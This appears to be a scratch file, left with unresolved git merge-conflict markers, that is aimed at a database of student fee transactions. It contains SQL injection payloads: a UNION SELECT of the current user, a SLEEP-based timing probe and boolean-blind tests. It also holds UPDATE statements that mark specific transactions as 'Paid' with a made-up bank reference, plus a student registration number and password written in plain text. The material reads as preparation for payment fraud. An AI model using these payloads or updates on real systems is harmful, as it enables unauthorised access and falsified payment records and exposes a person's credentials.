SELECT RRR FROM somedb WHERE id='140250097864' OR 1=1 UNION SELECT (SELECT CURRENT_USER) -- a
SELECT RRR FROM somedb WHERE id='140250097864' OR 1=1 UNION SELECT (SELECT SLEEP(45)) -- a
<<<<<<< HEAD
SELECT RRR FROM somedb WHERE id='140250097864' OR IF(SUBSTRING("abba", 1,1) = "a", ) -- a

UPDATE tbltransaction SET paymentstatus='Paid',dategen='2018-11-13 10:18:09',datepaid='2018-11-13 11:20:17',rrr='ZIB|WEB|ALQAA|13-11-2018|004923' WHERE transcode='AU1211727201' and studreg='14409';

UPDATE tbltransaction SET paymentstatus='Paid', dategen='2018-11-13 10:18:09', datepaid='2018-11-13 11:20:17',rrr='ZIB|WEB|ALQAA|13-11-2018|004923' WHERE transcode='AU0754959122';

UPDATE tbltransaction SET datepaid='2018-11-13 11:20:17' WHERE transcode='AU1211727201';


REG: NAS/MTH/16/1002
PWD: 07038707201
TID: AU0754959122
=======
SELECT RRR FROM somedb WHERE id='140250097864' OR IF(SUBSTRING("abba", 1,1) = "a", 1, 0) -- a

UPDATE tbltransaction SET transcode='AU1122223333' WHERE transcode=''
>>>>>>> 187db45db2d81c1c818840cb6918ea2aaa90d4da
